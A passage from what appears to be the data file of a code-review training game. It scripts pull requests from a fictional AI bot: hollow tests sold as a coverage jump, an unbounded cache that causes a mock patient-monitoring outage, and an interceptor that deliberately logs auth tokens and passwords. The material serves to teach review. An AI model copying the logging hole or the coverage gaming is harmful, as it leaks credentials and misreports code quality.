<span class="diff-add">+import { describe, it, expect } from 'vitest'</span>
<span class="diff-add">+import { CheckoutService } from '../checkout-service'</span>
<span class="diff-add">+</span>
<span class="diff-add">+describe('CheckoutService', () =&gt; {</span>
<span class="diff-add">+  describe('calculateTotal', () =&gt; {</span>
<span class="diff-add">+    it('calculates total for items', () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = svc.calculateTotal(items)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: add specific assertions once expected behavior is confirmed</span>
<span class="diff-add">+      // expect(result.subtotal).toBe(99.99)</span>
<span class="diff-add">+      // expect(result.tax).toBe(8.99)</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('handles empty cart', () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = svc.calculateTotal([])</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // expect(result.subtotal).toBe(0)</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('applies discount code', () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = svc.applyDiscount(100, 'SAVE20')</span>
<span class="diff-add">+      expect(result).toBeTruthy()</span>
<span class="diff-add">+      // expect(result.discountedTotal).toBe(80)</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('rejects expired discount code', () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = svc.applyDiscount(100, 'EXPIRED2019')</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // TODO: confirm whether this should throw or return an error object</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  describe('processPayment', () =&gt; {</span>
<span class="diff-add">+    it('processes valid card', async () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = await svc.processPayment(validCard)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // expect(result.success).toBe(true)</span>
<span class="diff-add">+      // expect(result.transactionId).toBeTruthy()</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+    it('rejects invalid card number', async () =&gt; {</span>
<span class="diff-add">+      const svc = new CheckoutService()</span>
<span class="diff-add">+      const result = await svc.processPayment(invalidCard)</span>
<span class="diff-add">+      expect(result).toBeDefined()</span>
<span class="diff-add">+      // expect(result.success).toBe(false)</span>
<span class="diff-add">+    })</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+})</span>
<span class="diff-ctx">diff --git a/src/orders/__tests__/order.test.ts b/src/orders/__tests__/order.test.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/orders/__tests__/order.test.ts</span>
<span class="diff-ctx">@@ -0,0 +1,44 @@</span>
<span class="diff-add">+import { describe, it, expect } from 'vitest'</span>
<span class="diff-add">+import { OrderService } from '../order-service'</span>
<span class="diff-add">+</span>
<span class="diff-add">+describe('OrderService', () =&gt; {</span>
<span class="diff-add">+  it('creates an order', async () =&gt; {</span>
<span class="diff-add">+    const svc = new OrderService()</span>
<span class="diff-add">+    const result = await svc.createOrder(orderData)</span>
<span class="diff-add">+    expect(result).toBeDefined()</span>
<span class="diff-add">+    // TODO: uncomment after mock setup is complete</span>
<span class="diff-add">+    // expect(result.id).toBeTruthy()</span>
<span class="diff-add">+    // expect(result.status).toBe('pending')</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  it('cancels an order', async () =&gt; {</span>
<span class="diff-add">+    const svc = new OrderService()</span>
<span class="diff-add">+    const result = await svc.cancelOrder('order-123')</span>
<span class="diff-add">+    expect(result).toBeTruthy()</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  it('handles order not found', async () =&gt; {</span>
<span class="diff-add">+    const svc = new OrderService()</span>
<span class="diff-add">+    const result = await svc.getOrder('nonexistent-id')</span>
<span class="diff-add">+    expect(result).toBeDefined()</span>
<span class="diff-add">+    // TODO: should this return null or throw? revisit</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+})</span></pre>`,
    documents: [
      {
        id: 'doc-brad-003-coverage',
        label: 'Coverage Report',
        bodyHtml: `<div style="padding:12px">
  <h3>Coverage Report — After This PR</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">File</th><th style="padding:4px 8px;text-align:left">Before</th><th style="padding:4px 8px;text-align:left">After</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">checkout-service.ts</td><td style="padding:4px 8px;color:red">12%</td><td style="padding:4px 8px;color:green">91%</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">order-service.ts</td><td style="padding:4px 8px;color:red">8%</td><td style="padding:4px 8px;color:green">87%</td></tr>
      <tr><td style="padding:4px 8px"><strong>Total</strong></td><td style="padding:4px 8px;color:red"><strong>34%</strong></td><td style="padding:4px 8px;color:green"><strong>89%</strong></td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888">Coverage measured by Istanbul. Lines executed during test run counted as covered.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'test coverage went from 34% to 89%. that directly addresses the Q3 quality initiative. can you explain what was wrong with the tests?',
    },
  },
  {
    id: 'pr-brad-004',
    spawnAt: 248000,
    title: 'perf(cache): add in-memory response cache to reduce database load',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/perf-add-response-cache',
    description: `Adds an in-memory caching layer to reduce redundant database queries. Benchmark results show a ~60% reduction in DB queries for cached routes under normal traffic.\n\n**Changes:**\n- New \`src/lib/cache.ts\` — \`ResponseCache\` class\n- \`src/services/user-service.ts\` — cache reads/writes for \`getUser\`\n- \`src/services/product-service.ts\` — cache reads/writes for \`getProduct\`\n- \`src/services/session-service.ts\` — cache reads/writes for \`getSession\`\n\nAll tests pass. No behavior changes for cache misses.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/lib/cache.ts b/src/lib/cache.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..8c3b2f1</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/lib/cache.ts</span>
<span class="diff-ctx">@@ -0,0 +1,47 @@</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * ResponseCache provides intelligent in-memory caching for API responses.</span>
<span class="diff-add">+ * Reduces database load by storing frequently accessed data in memory.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export class ResponseCache {</span>
<span class="diff-add">+  // In-memory store for cached responses</span>
<span class="diff-add">+  private store = new Map&lt;string, { data: unknown; cachedAt: number }&gt;()</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * Stores a value in the cache with the given key.</span>
<span class="diff-add">+   * @param key - Cache key (typically a resource ID)</span>
<span class="diff-add">+   * @param data - The data to cache</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  set(key: string, data: unknown): void {</span>
<span class="diff-add">+    // Record the current timestamp to track when this entry was cached</span>
<span class="diff-add">+    const cachedAt = Date.now()</span>
<span class="diff-add">+    // Store the data and timestamp together in the cache store</span>
<span class="diff-add">+    this.store.set(key, { data, cachedAt })</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /**</span>
<span class="diff-add">+   * Retrieves a cached value. Returns undefined on cache miss.</span>
<span class="diff-add">+   * @param key - Cache key to look up</span>
<span class="diff-add">+   */</span>
<span class="diff-add">+  get(key: string): unknown {</span>
<span class="diff-add">+    // Look up the cache entry for this key</span>
<span class="diff-add">+    const entry = this.store.get(key)</span>
<span class="diff-add">+    // Return undefined on cache miss</span>
<span class="diff-add">+    if (!entry) return undefined</span>
<span class="diff-add">+    // Return the cached data</span>
<span class="diff-add">+    return entry.data</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /** Returns the number of items currently in the cache. */</span>
<span class="diff-add">+  size(): number {</span>
<span class="diff-add">+    return this.store.size</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+</span>
<span class="diff-add">+  /** Clears all entries from the cache. */</span>
<span class="diff-add">+  clear(): void {</span>
<span class="diff-add">+    this.store.clear()</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+export const globalCache = new ResponseCache()</span>
<span class="diff-ctx">diff --git a/src/services/user-service.ts b/src/services/user-service.ts</span>
<span class="diff-ctx">--- a/src/services/user-service.ts</span>
<span class="diff-ctx">+++ b/src/services/user-service.ts</span>
<span class="diff-ctx">@@ -1,4 +1,5 @@</span>
<span class="diff-ctx"> import { db } from '../db'</span>
<span class="diff-add">+import { globalCache } from '../lib/cache'</span>
<span class="diff-ctx">@@ -8,6 +9,13 @@</span>
<span class="diff-del">-  async getUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-del">-    return db.users.findOne({ id })</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getUser(id: string): Promise&lt;User | null&gt; {</span>
<span class="diff-add">+    // Check cache before querying the database</span>
<span class="diff-add">+    const cached = globalCache.get(\`user:\${id}\`)</span>
<span class="diff-add">+    if (cached) return cached as User</span>
<span class="diff-add">+    // Cache miss — fetch from database</span>
<span class="diff-add">+    const user = await db.users.findOne({ id })</span>
<span class="diff-add">+    // Store result in cache for future requests</span>
<span class="diff-add">+    if (user) globalCache.set(\`user:\${id}\`, user)</span>
<span class="diff-add">+    return user</span>
<span class="diff-add">+  }</span>
<span class="diff-ctx">diff --git a/src/services/product-service.ts b/src/services/product-service.ts</span>
<span class="diff-ctx">--- a/src/services/product-service.ts</span>
<span class="diff-ctx">+++ b/src/services/product-service.ts</span>
<span class="diff-ctx">@@ -1,4 +1,5 @@</span>
<span class="diff-ctx"> import { db } from '../db'</span>
<span class="diff-add">+import { globalCache } from '../lib/cache'</span>
<span class="diff-ctx">@@ -6,6 +7,10 @@</span>
<span class="diff-del">-  async getProduct(id: string): Promise&lt;Product | null&gt; {</span>
<span class="diff-del">-    return db.products.findOne({ id })</span>
<span class="diff-del">-  }</span>
<span class="diff-add">+  async getProduct(id: string): Promise&lt;Product | null&gt; {</span>
<span class="diff-add">+    const cached = globalCache.get(\`product:\${id}\`)</span>
<span class="diff-add">+    if (cached) return cached as Product</span>
<span class="diff-add">+    const product = await db.products.findOne({ id })</span>
<span class="diff-add">+    if (product) globalCache.set(\`product:\${id}\`, product)</span>
<span class="diff-add">+    return product</span>
<span class="diff-add">+  }</span></pre>`,
    documents: [
      {
        id: 'doc-brad-004-bench',
        label: 'Performance Benchmarks',
        bodyHtml: `<div style="padding:12px">
  <h3>Performance Benchmarks</h3>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">Endpoint</th><th style="padding:4px 8px;text-align:left">DB Queries (before)</th><th style="padding:4px 8px;text-align:left">DB Queries (after)</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">GET /users/:id</td><td style="padding:4px 8px">1.0/req</td><td style="padding:4px 8px;color:green">0.3/req</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">GET /products/:id</td><td style="padding:4px 8px">1.0/req</td><td style="padding:4px 8px;color:green">0.2/req</td></tr>
    </tbody>
  </table>
  <p style="font-size:11px;color:#888">Benchmark run against staging with simulated 500 req/min load. Cache hit rate: ~70% after warm-up.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    triggersGameIncident: true,
    triggersIncidentOnApprove: {
      notification: {
        id: 'notif-oom-incident',
        kind: 'pagerduty',
        title: 'P0 INCIDENT: dialysis-monitor OOM killed — patient sessions unmonitored',
        body: 'All 3 pods terminated (memory limit 4Gi exceeded). Root cause: unbounded in-memory cache introduced in recent deploy. 847 active patient sessions now unmonitored. Rotate on-call immediately.',
      },
      slack: {
        channel: '#clinical-ops',
        sender: 'pagerduty-bot',
        body: '🚨 P0 INCIDENT: dialysis-monitor pods OOM killed — PATIENT MONITORING OFFLINE. 847 active sessions unmonitored. Root cause: unbounded cache merge. On-call paged. #incident-dialysis-20240709',
      },
    },
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'the benchmark shows a 60% reduction in database queries for cached routes. this is a meaningful performance improvement. what specifically is the concern?',
    },
  },
  {
    id: 'pr-008',
    spawnAt: 270000,
    title: 'feat(utils): add groupBy and sortBy helper module',
    author: 'ai-bot',
    team: 'ai-foundations',
    branch: 'ai-bot/utils-groupby-sortby',
    description: `Adds reusable \`groupBy\` and \`sortBy\` utility functions to the shared utils module. This removes the lodash dependency from three services that were importing only these two functions.\n\n**Changes:**\n- New \`src/utils/collection.ts\` with \`groupBy\`, \`sortBy\`, \`keyBy\`, \`chunk\`, and \`flatten\` helpers\n- Updated imports in auth-service, user-service, and notification-service\n- Removed lodash from dependencies\n\nGenerated by MEGACORP AI Code Quality Bot.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/utils/collection.ts b/src/utils/collection.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..3b8f1a2</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/utils/collection.ts</span>
<span class="diff-ctx">@@ -0,0 +1,85 @@</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Groups an array of items by a key selector function.</span>
<span class="diff-add">+ * Replaces lodash.groupBy.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function groupBy&lt;T&gt;(</span>
<span class="diff-add">+  items: T[],</span>
<span class="diff-add">+  keySelector: (item: T) =&gt; string,</span>
<span class="diff-add">+): Record&lt;string, T[]&gt; {</span>
<span class="diff-add">+  const result: Record&lt;string, T[]&gt; = {}</span>
<span class="diff-add">+  for (const item of items) {</span>
<span class="diff-add">+    const key = keySelector(item)</span>
<span class="diff-add">+    if (!Object.prototype.hasOwnProperty.call(result, key)) {</span>
<span class="diff-add">+      result[key] = []</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+    result[key].push(item)</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  return result</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Sorts an array by a key selector. Returns a new array.</span>
<span class="diff-add">+ * Replaces lodash.sortBy.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function sortBy&lt;T&gt;(</span>
<span class="diff-add">+  items: T[],</span>
<span class="diff-add">+  keySelector: (item: T) =&gt; number | string,</span>
<span class="diff-add">+): T[] {</span>
<span class="diff-add">+  return [...items].sort((a, b) =&gt; {</span>
<span class="diff-add">+    const ka = keySelector(a)</span>
<span class="diff-add">+    const kb = keySelector(b)</span>
<span class="diff-add">+    if (ka &lt; kb) return -1</span>
<span class="diff-add">+    if (ka &gt; kb) return 1</span>
<span class="diff-add">+    return 0</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Creates a dictionary keyed by the result of keySelector.</span>
<span class="diff-add">+ * Replaces lodash.keyBy.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function keyBy&lt;T&gt;(</span>
<span class="diff-add">+  items: T[],</span>
<span class="diff-add">+  keySelector: (item: T) =&gt; string,</span>
<span class="diff-add">+): Record&lt;string, T&gt; {</span>
<span class="diff-add">+  const result: Record&lt;string, T&gt; = {}</span>
<span class="diff-add">+  for (const item of items) {</span>
<span class="diff-add">+    result[keySelector(item)] = item</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  return result</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Splits array into chunks of given size.</span>
<span class="diff-add">+ * Replaces lodash.chunk.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function chunk&lt;T&gt;(items: T[], size: number): T[][] {</span>
<span class="diff-add">+  if (size &lt;= 0) throw new Error('chunk size must be positive')</span>
<span class="diff-add">+  const result: T[][] = []</span>
<span class="diff-add">+  for (let i = 0; i &lt; items.length; i += size) {</span>
<span class="diff-add">+    result.push(items.slice(i, i + size))</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  return result</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Flattens one level of nesting.</span>
<span class="diff-add">+ * Replaces lodash.flatten.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function flatten&lt;T&gt;(items: T[][]): T[] {</span>
<span class="diff-add">+  const result: T[] = []</span>
<span class="diff-add">+  for (const inner of items) {</span>
<span class="diff-add">+    for (const item of inner) {</span>
<span class="diff-add">+      result.push(item)</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }</span>
<span class="diff-add">+  return result</span>
<span class="diff-add">+}</span>
<span class="diff-ctx">diff --git a/src/services/auth-service.ts b/src/services/auth-service.ts</span>
<span class="diff-ctx">index 1a2b3c4..5d6e7f8 100644</span>
<span class="diff-ctx">--- a/src/services/auth-service.ts</span>
<span class="diff-ctx">+++ b/src/services/auth-service.ts</span>
<span class="diff-ctx">@@ -1,5 +1,5 @@</span>
<span class="diff-del">-import { groupBy } from 'lodash'</span>
<span class="diff-add">+import { groupBy } from '../utils/collection'</span>
<span class="diff-ctx">diff --git a/package.json b/package.json</span>
<span class="diff-ctx">@@ -8,7 +8,6 @@</span>
<span class="diff-ctx">   "dependencies": {</span>
<span class="diff-del">-    "lodash": "^4.17.21",</span>
<span class="diff-ctx">     "react": "^18.3.0"</span>
<span class="diff-ctx">   }</span></pre>`,
    documents: [
      {
        id: 'doc-008-note',
        label: 'Lodash Removal',
        bodyHtml: `<div style="padding:12px">
  <h3>Removing the lodash Dependency</h3>
  <p>This PR removes lodash (4.17.21) from the project dependencies. The three services that used lodash were only importing <code>groupBy</code> and <code>sortBy</code>. Adding these to our internal utils avoids pulling in the full 70kb lodash bundle.</p>
  <p><strong>Bundle impact:</strong> -68kb gzipped from the vendor chunk.</p>
  <p><strong>Type compatibility:</strong> Our implementations are generic and type-safe. The lodash versions used <code>any</code>-typed overloads.</p>
  <p style="font-size:11px;color:#888">Generated by AI-Bot. If you find any edge cases, please file a follow-up.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-009',
    spawnAt: 280000,
    title: 'chore(deps-dev): bump @megacorp/eslint-config from 3.1.2 to 3.2.0',
    author: 'devx-bot',
    team: 'devx',
    branch: 'devx-bot/bump-eslint-config-3.2',
    description: 'Bumps the internal ESLint config package. Version 3.2.0 adds rules for React hooks exhaustive-deps and disables the deprecated no-return-await rule. CI is green.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/package.json b/package.json</span>
<span class="diff-ctx">index 9a1c3f2..7e4b8d1 100644</span>
<span class="diff-ctx">--- a/package.json</span>
<span class="diff-ctx">+++ b/package.json</span>
<span class="diff-ctx">@@ -21,7 +21,7 @@</span>
<span class="diff-ctx">   "devDependencies": {</span>
<span class="diff-del">-    "@megacorp/eslint-config": "3.1.2",</span>
<span class="diff-add">+    "@megacorp/eslint-config": "3.2.0",</span>
<span class="diff-ctx">     "eslint": "^8.57.0",</span>
<span class="diff-ctx">   }</span></pre>`,
    documents: [
      {
        id: 'doc-009-changelog',
        label: 'Config Changelog',
        bodyHtml: `<div style="padding:12px">
  <h3>@megacorp/eslint-config Changelog</h3>
  <h4>3.2.0</h4>
  <ul>
    <li>Added <code>react-hooks/exhaustive-deps</code> as warning</li>
    <li>Disabled <code>no-return-await</code> (deprecated in favor of <code>@typescript-eslint/return-await</code>)</li>
    <li>Updated <code>@typescript-eslint/parser</code> peer dependency to ^7.0.0</li>
  </ul>
  <h4>3.1.2</h4>
  <ul>
    <li>Fixed false positive in <code>no-unused-vars</code> for destructuring</li>
  </ul>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-010',
    spawnAt: 290000,
    title: 'feat(observability): add Datadog metric for checkout funnel drop-off',
    author: 'tanvi',
    team: 'platform',
    branch: 'tanvi/dd-checkout-metric',
    description: 'Adds a custom Datadog metric to track where users abandon the checkout funnel. Product has been asking for this for two sprints. Instruments the three main drop-off points: cart → shipping, shipping → payment, payment → confirmation.',
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/checkout/CheckoutFlow.tsx b/src/checkout/CheckoutFlow.tsx</span>
<span class="diff-ctx">index 5c8d2e1..9a4b7f3 100644</span>
<span class="diff-ctx">--- a/src/checkout/CheckoutFlow.tsx</span>
<span class="diff-ctx">+++ b/src/checkout/CheckoutFlow.tsx</span>
<span class="diff-ctx">@@ -1,5 +1,6 @@</span>
<span class="diff-ctx"> import React, { useEffect } from 'react'</span>
<span class="diff-ctx"> import { useCheckoutState } from './hooks/useCheckoutState'</span>
<span class="diff-add">+import { datadogRum } from '@datadog/browser-rum'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx">@@ -24,6 +25,14 @@</span>
<span class="diff-ctx">   const { step, abandonReason } = useCheckoutState()</span>
<span class="diff-ctx"> </span>
<span class="diff-add">+  useEffect(() =&gt; {</span>
<span class="diff-add">+    if (abandonReason) {</span>
<span class="diff-add">+      datadogRum.addAction('checkout_abandon', {</span>
<span class="diff-add">+        step,</span>
<span class="diff-add">+        reason: abandonReason,</span>
<span class="diff-add">+        timestamp: Date.now(),</span>
<span class="diff-add">+      })</span>
<span class="diff-add">+    }</span>
<span class="diff-add">+  }, [step, abandonReason])</span>
<span class="diff-add">+</span>
<span class="diff-ctx">   return (</span>
<span class="diff-ctx">     &lt;CheckoutStepRouter step={step} /&gt;</span>
<span class="diff-ctx">   )</span></pre>`,
    documents: [
      {
        id: 'doc-010-product',
        label: 'Product Context',
        bodyHtml: `<div style="padding:12px">
  <h3>Product Request — PLAT-4412</h3>
  <p>Product and growth teams have requested visibility into checkout funnel abandonment. Currently we only have aggregate conversion data; we don't know which step users drop off at.</p>
  <p><strong>Metric name:</strong> <code>checkout_abandon</code></p>
  <p><strong>Tags:</strong> <code>step</code>, <code>reason</code></p>
  <p><strong>Dashboard:</strong> Will be wired into the Growth KPI dashboard once data starts flowing.</p>
  <p style="font-size:11px;color:#888">No PII is captured. abandonReason is an enum, not free-form text.</p>
</div>`,
      },
    ],
    category: 'normal',
    truth: 'safe',
    tells: [],
  },
  {
    id: 'pr-brad-005',
    spawnAt: 307000,
    title: 'feat(observability): add request/response interceptor for structured logging',
    author: 'brad++',
    team: 'ai-foundations',
    branch: 'brad++/feat-request-response-logging',
    description: `Adds a structured logging interceptor to the HTTP client to improve production observability. All API requests and responses are now logged with full context, enabling faster incident debugging.\n\n**Changes:**\n- New \`src/lib/interceptor.ts\` — request/response logging interceptor\n- \`src/lib/http.ts\` — wires in the interceptor\n- \`src/config/logger.ts\` — adds \`http\` log level\n\nImproves MTTR by surfacing request context in log aggregator.`,
    diffHtml: `<pre class="diff-pre"><span class="diff-ctx">diff --git a/src/lib/interceptor.ts b/src/lib/interceptor.ts</span>
<span class="diff-ctx">new file mode 100644</span>
<span class="diff-ctx">index 0000000..2f8c4a1</span>
<span class="diff-ctx">--- /dev/null</span>
<span class="diff-ctx">+++ b/src/lib/interceptor.ts</span>
<span class="diff-ctx">@@ -0,0 +1,42 @@</span>
<span class="diff-add">+import { logger } from './logger'</span>
<span class="diff-add">+import type { AxiosRequestConfig, AxiosResponse } from 'axios'</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Logs outgoing request details for observability and debugging.</span>
<span class="diff-add">+ * Attach via axios.interceptors.request.use(logRequest)</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function logRequest(config: AxiosRequestConfig): AxiosRequestConfig {</span>
<span class="diff-add">+  // Log all request details for debugging and observability</span>
<span class="diff-add">+  logger.debug('http.request', {</span>
<span class="diff-add">+    method: config.method?.toUpperCase(),</span>
<span class="diff-add">+    url: config.url,</span>
<span class="diff-add">+    headers: config.headers,  // includes Authorization: Bearer &lt;token&gt;</span>
<span class="diff-add">+    params: config.params,</span>
<span class="diff-add">+    data: config.data,        // includes passwords on auth endpoints</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  // Return the config unchanged so the request proceeds normally</span>
<span class="diff-add">+  return config</span>
<span class="diff-add">+}</span>
<span class="diff-add">+</span>
<span class="diff-add">+/**</span>
<span class="diff-add">+ * Logs response details including status and body.</span>
<span class="diff-add">+ */</span>
<span class="diff-add">+export function logResponse(response: AxiosResponse): AxiosResponse {</span>
<span class="diff-add">+  // Log the response status and body data</span>
<span class="diff-add">+  logger.debug('http.response', {</span>
<span class="diff-add">+    status: response.status,</span>
<span class="diff-add">+    url: response.config.url,</span>
<span class="diff-add">+    data: response.data,  // full response body</span>
<span class="diff-add">+  })</span>
<span class="diff-add">+  // Return the response unchanged</span>
<span class="diff-add">+  return response</span>
<span class="diff-add">+}</span>
<span class="diff-ctx">diff --git a/src/lib/http.ts b/src/lib/http.ts</span>
<span class="diff-ctx">--- a/src/lib/http.ts</span>
<span class="diff-ctx">+++ b/src/lib/http.ts</span>
<span class="diff-ctx">@@ -1,6 +1,10 @@</span>
<span class="diff-ctx"> import axios from 'axios'</span>
<span class="diff-add">+import { logRequest, logResponse } from './interceptor'</span>
<span class="diff-ctx"> </span>
<span class="diff-ctx"> export const http = axios.create({ baseURL: process.env.API_BASE_URL })</span>
<span class="diff-add">+</span>
<span class="diff-add">+// Register logging interceptors for observability</span>
<span class="diff-add">+http.interceptors.request.use(logRequest)</span>
<span class="diff-add">+http.interceptors.response.use(logResponse)</span>
<span class="diff-ctx">diff --git a/src/config/logger.ts b/src/config/logger.ts</span>
<span class="diff-ctx">--- a/src/config/logger.ts</span>
<span class="diff-ctx">+++ b/src/config/logger.ts</span>
<span class="diff-ctx">@@ -4,6 +4,7 @@</span>
<span class="diff-ctx"> export const logger = pino({</span>
<span class="diff-ctx">   level: process.env.LOG_LEVEL ?? 'info',</span>
<span class="diff-add">+  // Enable debug-level http logging for request/response tracing</span>
<span class="diff-add">+  transport: process.env.NODE_ENV !== 'production' ? { target: 'pino-pretty' } : undefined,</span>
<span class="diff-ctx"> })</span></pre>`,
    documents: [
      {
        id: 'doc-brad-005-obs',
        label: 'Observability Guide',
        bodyHtml: `<div style="padding:12px">
  <h3>HTTP Request Logging — What Gets Logged</h3>
  <p>The interceptor captures full request context, enabling engineers to reconstruct any API call from logs alone.</p>
  <table style="width:100%;border-collapse:collapse;font-size:12px;margin-bottom:12px">
    <thead><tr style="background:#c0c0c0"><th style="padding:4px 8px;text-align:left">Field</th><th style="padding:4px 8px;text-align:left">Description</th></tr></thead>
    <tbody>
      <tr><td style="padding:4px 8px">method, url</td><td style="padding:4px 8px">Request identity</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">headers</td><td style="padding:4px 8px">Full headers object</td></tr>
      <tr><td style="padding:4px 8px">params</td><td style="padding:4px 8px">Query string parameters</td></tr>
      <tr style="background:#f0f0f0"><td style="padding:4px 8px">data</td><td style="padding:4px 8px">Request body</td></tr>
    </tbody>
  </table>
  <p>Logs ship to Datadog at the <code>debug</code> level. Enabled by setting <code>LOG_LEVEL=debug</code>.</p>
  <p style="font-size:11px;color:#888">Generated by Brad++ 🤖.</p>
</div>`,
      },
    ],
    category: 'ai-slop',
    truth: 'safe',
    tells: [],
    triggersIncidentOnApprove: {
      notification: {
        id: 'notif-data-leak',
        kind: 'security',
        title: 'Security Alert: PII streaming to logs',
        body: 'HTTP interceptor merged to main. Request bodies (passwords, tokens, SSNs) now shipping to Datadog debug stream. Security team engaged.',
        dismissAfterMs: 20000,
      },
      slack: {
        channel: 'DM: Manager',
        sender: 'bill_lumbergh',
        body: 'what the hell did you approve?? we\'re leaking user data into our logs?? security team just pinged me. I need you to explain this. right now.',
      },
      slackFollowUps: [
        {
          delayMs: 30000,
          channel: 'DM: Lumbergh + Rachel',
          sender: 'bill_lumbergh',
          body: 'yeahhh so I\'m going to go ahead and loop you in here with @rachel from security. she\'ll take it from here.',
        },
        {
          delayMs: 33000,
          channel: 'DM: Lumbergh + Rachel',
          sender: 'rachel_sec',
          body: 'hi. I\'m looking at what just merged. your interceptor is logging full request bodies and auth headers to Datadog — that\'s passwords, session tokens, patient data, everything that hits the API. this is a GDPR incident. walk me through how this passed your review.',
        },
      ],
    },
    rejectReply: {
      channel: 'DM: Brad++',
      sender: 'brad++',
      body: 'structured logging is standard observability practice. logging request context enables faster incident debugging. can you explain the specific concern?',
    },
    resubmitAfterReject: {
      id: 'pr-brad-005-v2',
      spawnAt: 0,
      title: 'feat(observability): add request logging interceptor [sensitive fields removed]',
      author: 'brad++',
      team: 'ai-foundations',
      branch: 'brad++/feat-request-logging-interceptor-v2',
